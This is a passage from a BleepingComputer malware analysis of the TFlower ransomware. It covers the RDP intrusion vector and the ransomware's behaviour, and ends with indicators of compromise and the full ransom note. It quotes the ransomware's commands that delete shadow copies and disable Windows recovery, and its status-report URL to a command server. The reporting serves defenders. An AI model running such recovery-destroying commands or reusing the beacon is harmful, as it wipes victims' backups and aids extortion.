At the time it was just thought to be another generic ransomware, but sources who\nhave performed incident response involving this ransomware have told BleepingComputer\nthat its activity is beginning to pick up.\n\n## Gaining access via RDP\n\nTFlower is being installed in a corporate network through exposed Remote Desktop\nservices that are being hacked by attackers.\n\nOnce the attackers gain access to the machine, they will infect the local machine or may\nattempt to traverse the network through tools such as PowerShell Empire, PSExec, etc.\n\n\n-----\n\nWhen executed, the ransomware will display a console that shows the activity being\nperformed by the ransomware while it is encrypting a computer.\n\n**TFlower Console**\nIt then connects back to the command and control server in order to give a status check\nthat it has started encrypting a computer. In one of the samples seen by BleepingComputer,\nthis C2 is located on a hacked wordpress site and uses the following URL:\n```\nhttps://www.domain.com/wp-includes/wp-merge.php?name=[computer_name]&state=start\n\n```\nIt will then attempt to clear the Shadow Volume Copies and execute commands that disable\nthe Windows 10 repair environment.\n```\nvssadmin.exe delete shadows /all /quiet\nbcdedit.exe /set {default} recoveryenabled no\nbcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {current} recoveryenabled no\nbcdedit.exe /set {current} bootstatuspolicy ignoreallfailures\n\n```\nIt also looks for and terminates the Outlook.exe process in order to allow its data files to be\nopen for encrypting.\n\n\n-----\n\n**Terminating the outlook.exe process**\nIt will then proceed to encrypt the data on the computer, skipping any files in the Windows\nor Sample Music folders.\n\nWhen encrypting files, it will not add an extension, but will prepend the *tflower marker and\nwhat appears to be the encrypted encryption key for the file as shown below.\n\n\n-----\n\n**Encrypted TFlower File**\nWhen done encrypting a computer, it will send another status update to the C2 in the form\nof:\n```\nhttps://www.domain.com/wp-includes/wp-merge.php?name=\n[computer_name]&state=success%20[encrypted_file_count],%20retry%20[retried_file_count\n\n```\nVictims will now find a ransom notes named !_Notice_!.txt placed throughout the computer\nand on the Windows Desktop. This ransom note will instruct victims to contact\nthe flower.harris@protonmail.com or flower.harris@tutanota.com email addresses for\npayment instructions.\n\n\n-----\n\n**TFlower Ransom Note**\nIt is not known how much the ransom amounts are at this time.\n\nTFlower is still being researched, so it is not known at this time if there are any weaknesses\nin the encryption that could allow a user to get their files back for free.\n\n### Related Articles:\n\n[Windows 11 KB5014019 breaks Trend Micro ransomware protection](https://www.bleepingcomputer.com/news/security/windows-11-kb5014019-breaks-trend-micro-ransomware-protection/)\n\n[Industrial Spy data extortion market gets into the ransomware game](https://www.bleepingcomputer.com/news/security/industrial-spy-data-extortion-market-gets-into-the-ransomware-game/)\n\n[New ‘Cheers’ Linux ransomware targets VMware ESXi servers](https://www.bleepingcomputer.com/news/security/new-cheers-linux-ransomware-targets-vmware-esxi-servers/)\n\n[SpiceJet airline passengers stranded after ransomware attack](https://www.bleepingcomputer.com/news/security/spicejet-airline-passengers-stranded-after-ransomware-attack/)\n\n[US Senate: Govt’s ransomware fight hindered by limited reporting](https://www.bleepingcomputer.com/news/security/us-senate-govt-s-ransomware-fight-hindered-by-limited-reporting/)\n\n## IOCs\n\n### Hashes:\n```\n6c75998580fb05c01b10f4703299ffd782bec55c8765c030b8a4760fff6045fe\n\n Associated Files:\n!_Notice_!.txt\nchilli.exe\n\n```\n\n-----\n\n### Registry Entries:\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \"proxycap\"=\"\n[path_to]\\[ransomware].exe\"\n\n Associated Email Addresses:\nflower.harris@protonmail.com\nflower.harris@tutanota.com\n\n Ransom Note Text:\n           IMPORTANT NOTICE THAT IS URGENT AND TRUE\n     =================================================================\nDear Sir/Ma,\nSorry to inform you but many files of your COMPANY has just been ENCRYPTED with a\nSTRONG key.\nThis simply means that you will not be able to use your files until it is decrypted\nby the same key used in encrypting it.\nTO get the DECRYPT TOOL for your COMPANY, you have to make payment to us so as to\nrecover your files.\n                  NOTE\n    ======================================================================\nYou may upload 1 of your encrypted files to test the decryption for free.\nBut, the file should not contain any valuable information.\nE-MAIL Address:=>>\nflower.harris@protonmail.com\nflower.harris@tutanota.com\n\n```\n[Ransomware](https://www.bleepingcomputer.com/tag/ransomware/)\n[Remote Desktop](https://www.bleepingcomputer.com/tag/remote-desktop/)\n[TFlower](https://www.bleepingcomputer.com/tag/tflower/)\n\n[Lawrence Abrams](https://www.bleepingcomputer.com/author/lawrence-abrams/)\n\nLawrence Abrams is the owner and Editor in Chief of BleepingComputer.com.
